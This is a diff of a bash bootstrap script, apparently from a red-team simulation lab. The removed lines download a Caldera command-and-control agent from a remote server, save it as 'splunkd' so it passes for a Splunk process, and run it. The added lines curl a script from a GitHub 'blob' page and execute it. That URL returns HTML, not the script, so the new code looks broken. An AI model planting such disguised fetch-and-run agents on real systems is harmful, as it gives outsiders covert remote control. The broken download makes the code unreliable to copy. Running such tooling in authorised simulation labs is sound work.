@@ -1,6 +1,5 @@
 #!/bin/bash
-
-server="http://ip-172-31-31-92.ec2.internal:8888";
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
-chmod +x splunkd;
-./splunkd -server $server -group red -v
+curl https://github.com/andrewjerry/BAS-Experiments/blob/main/AWS/Bootstrap_Scripts/caldera_agent_bootstrap.sh > bootstrap.sh
+chmod 755 bootstrap.sh
+./bootstrap.sh
+rm bootstrap.sh
